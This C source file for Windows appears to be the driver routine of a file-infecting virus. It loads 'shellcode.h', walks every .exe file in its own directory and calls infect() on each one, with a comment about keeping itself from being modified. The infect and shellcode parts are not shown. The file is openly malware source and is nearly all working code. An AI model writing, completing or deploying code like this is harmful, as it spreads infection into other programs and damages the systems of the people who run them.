#define _CRT_SECURE_NO_WARNINGS_GLOBALS
#define _CRT_SECURE_NO_WARNINGS

#include "shellcode.h"

int main()
{	
	WIN32_FIND_DATA FindFileData;
	HANDLE hFind;
	TCHAR dest[512] = { 0 };
	TCHAR original[128] = { 0 };// 自己的名字，防止改动自己
	int bytes = GetModuleFileName(NULL, dest, 512);

	while (dest[bytes] != '\\')
	{
		dest[bytes] = 0;
		bytes--;
	}
	wmemcpy(dest + bytes + 1, TEXT("\\*.exe"), 7);
	hFind = FindFirstFile(dest, &FindFileData);
	if (hFind == INVALID_HANDLE_VALUE)
	{
		printf("FindFirstFile failed (%d)\n", GetLastError());
		return 0;
	}
	else
	{
		func f = init_function();
		_tprintf(TEXT("The first file found is %s\n"),
			FindFileData.cFileName);
		wmemset(dest + bytes + 1, 0, 512 - bytes - 1);
		wmemcpy(dest + bytes + 1, FindFileData.cFileName, lstrlenW(FindFileData.cFileName));
		infect(dest, f);
		while (FindNextFile(hFind, &FindFileData)) {
			//
			_tprintf(TEXT("The next file found is %s\n"),
				FindFileData.cFileName);
			wmemset(dest + bytes + 1, 0, 512 - bytes - 1);
			wmemcpy(dest + bytes + 1, FindFileData.cFileName, lstrlenW(FindFileData.cFileName));
			infect(dest, f);
		}
		FindClose(hFind);
	}
	return 0;

}